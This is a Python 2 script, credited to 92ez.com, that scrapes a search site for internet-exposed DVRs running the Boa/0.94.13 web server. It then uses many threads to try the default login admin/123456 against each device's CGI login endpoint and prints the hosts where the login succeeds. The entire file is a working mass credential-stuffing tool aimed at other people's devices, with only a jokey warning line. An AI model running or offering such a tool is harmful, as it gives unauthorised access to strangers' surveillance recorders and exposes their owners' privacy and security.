#!/usr/bin/env python
# coding=utf-8

import threading
import requests
import Queue
import json
import sys
import re

reload(sys)
sys.setdefaultencoding('utf8')


def MyThread(iplist):

    threads = []
    queue = Queue.Queue()
    for host in iplist:
        queue.put(host)

    for x in xrange(0, int(sys.argv[1])):
        threads.append(tThread(queue))

    for t in threads:
        t.start()
    for t in threads:
        t.join()


class tThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):

        while not self.queue.empty():
            host = self.queue.get()
            try:
                getinfo(host)
            except:
                continue


def getinfo(host):
    timeout = 10
    api_url = host +'/cgi-bin/nmcgi.cgi?time=1479728762422'
    param = {
        "cbremember":"on",
        "hidactiontype":"LOGIN_AUTH_PROCESS",
        "login_button":"",
        "rdLanuage":"0",
        "rdLanuage":"1",
        "txtpassword":"123456",
        "txtusername":"admin"
    }
    s = requests.Session()

    try:
        result = json.loads(s.post(url=api_url, data=param, timeout=timeout).text)
        if result['LoginRtCode'] == "0":
            print host + ' Login success!'
    except:
        pass


if __name__ == '__main__':
    print '\n*************** HK dvr login ****************'
    print '              Author 92ez.com'
    print '       You should know what U R doing!'
    print '*********************************************\n'

    print '[*] Request to header.telnetscan.org ...'
    content1 = requests.get('http://header.telnetscan.org/search.php?s=Boa/0.94.13').content # 烽火众智 admin/123456

    content = content1
    iplist = re.findall(r'href=\"(.+?)">',content)

    print '[*] Total '+str(len(iplist))+" items..."
    print '[*] Running...\n'

    try:
        MyThread(iplist)
    except KeyboardInterrupt:
        print 'Keyboard Interrupt!'
        sys.exit()